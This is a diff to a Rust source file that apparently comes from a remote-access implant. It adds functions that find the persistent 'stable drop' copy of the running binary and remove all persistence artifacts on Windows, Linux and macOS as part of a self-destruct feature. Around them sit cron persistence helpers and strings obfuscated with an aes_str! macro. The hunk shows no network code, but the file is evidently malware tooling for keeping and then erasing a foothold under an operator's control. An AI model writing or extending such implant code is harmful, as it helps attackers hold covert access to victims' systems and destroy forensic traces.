@@ -176,6 +176,40 @@ pub fn remove_cron_macos(path: &str) -> Result<String, String> {
     { let _ = path; Err(aes_str!("macOS only")) }
 }
 
+// ── Full cleanup ──────────────────────────────────────────────────────
+
+/// Compute the stable-drop path of the currently running binary using the
+/// same layout as the platform's stable_drop() (without copying anything).
+/// Used by self-destruct so the persistent copy is deleted together with
+/// the running image.
+pub fn current_stable_path() -> Option<String> {
+    #[cfg(target_os = "windows")]
+    return windows::stable_path_for_current_exe();
+    #[cfg(target_os = "linux")]
+    return linux::stable_path_for_current_exe();
+    #[cfg(target_os = "macos")]
+    return macos::stable_path_for_current_exe();
+    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
+    None
+}
+
+/// Remove ALL persistence artifacts this install created on the current
+/// platform, keyed by the stable-drop location rather than operator-chosen
+/// label names. Returns a structured per-method report
+/// (`<method>: removed|failed|not-present`). Never fails hard - individual
+/// failures are reported inline so one stubborn artifact cannot abort the
+/// rest of the cleanup.
+pub fn cleanup_all() -> String {
+    #[cfg(target_os = "windows")]
+    return windows::cleanup_all();
+    #[cfg(target_os = "linux")]
+    return linux::cleanup_all();
+    #[cfg(target_os = "macos")]
+    return macos::cleanup_all();
+    #[cfg(not(any(target_os = "windows", target_os = "linux", target_os = "macos")))]
+    aes_str!("Persistence cleanup: unsupported platform")
+}
+
 // ── Inventory ─────────────────────────────────────────────────────────
 
 /// Return a human-readable inventory of installed persistence mechanisms.
